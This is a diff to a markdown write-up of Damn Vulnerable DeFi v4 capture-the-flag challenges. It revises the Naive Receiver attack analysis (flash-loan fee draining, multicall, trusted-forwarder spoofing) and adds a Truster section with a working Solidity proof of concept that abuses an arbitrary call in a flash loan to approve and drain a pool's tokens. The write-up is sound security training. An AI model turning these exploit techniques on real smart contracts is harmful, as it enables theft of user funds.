@@ -31,7 +31,7 @@ _from `_isSolved()`in test_
 4. _All funds sent to recovery account_
 
 ### Attack Analysis
-- The FlashLoanReceiver starts with 10 ETH and incurs a 1 ETH fee to the pool for each flash loan it takes. The vulnerability is that the `onFlashLoan` function doesn't verify the authorization of the flash loan's origin. By executing 10 flash loans with an amount of 0, we can deplete the FlashLoanReceiver's 10 ETH. However, the constraint is that the Nonce must be under 2. Since NaiveReceiverPool supports Multicall, we can leverage it to conduct all 10 flash loan operations in a single transaction, thereby meeting the Nonce requirement.
+- The vulnerability is that the `onFlashLoan` function in `FlashLoanReceiver` doesn't verify the authorization of the flash loan's origin. By executing 10 flash loans with an amount of 0, we can deplete the FlashLoanReceiver's 10 ETH. However, the constraint is that the Nonce must be under 2. Since `NaiveReceiverPool` supports `Multicall`, we can leverage it to conduct all 10 flash loan operations in a single transaction, thereby meeting the Nonce requirement.
 - The next step is to extract the initial 1000 ETH from the NaiveReceiverPool. The only way to transfer assets is through the `withdraw` function. For this function to execute, `_msgSender` must meet the conditions where `msg.sender` equals `trustedForwarder` and `msg.data.length` is at least 20 bytes, which leaves room for tampering.
 - Lastly, using a forwarder to execute a meta-transaction, the `msg.sender == trustedForwarder` condition can be met.
 
@@ -66,3 +66,33 @@ _from `_isSolved()`in test_
 See [test/naive-receiver/NaiveReceiver.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/naive-receiver/NaiveReceiver.t.sol)
 
 ---- 
+## 2.TRUSTER
+
+### Objective
+_from `_isSolved()`in test_
+1. _Player must have executed a single transaction_
+2. _All rescued funds sent to recovery account_
+
+### Attack Analysis
+- The vulnerability resides in `flashLoan()` in `TrusterLenderPool`, which includes a call to an arbitrary address with arbitrary data, `target.functionCall(data)`. We can use it to call the token and `approve()` the contract we want to later call the token and do a `transferFrom`.
+- Lastly, we need to execute the attack in one ATOMIC transaction. To complete this objective, the best approach is to execute the code in the `constructor()` of a contract. 
+
+### POC
+```solidity
+function test_truster() public checkSolvedByPlayer {
+    AttackTruster attackTruster = new AttackTruster(address(pool), address(token), recovery, TOKENS_IN_POOL);
+}
+
+contract AttackTruster {
+    constructor (address _pool, address _token, address _recovery, uint256 tokens) payable {
+        TrusterLenderPool pool = TrusterLenderPool(_pool);
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), tokens);
+        pool.flashLoan(0, address(this), _token, data);
+        DamnValuableToken token = DamnValuableToken(_token);
+        token.transferFrom(_pool, _recovery, tokens);
+    }
+}
+```
+See [test/naive-receiver/Truster.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/naive-receiver/Truster.t.sol)
+
+----
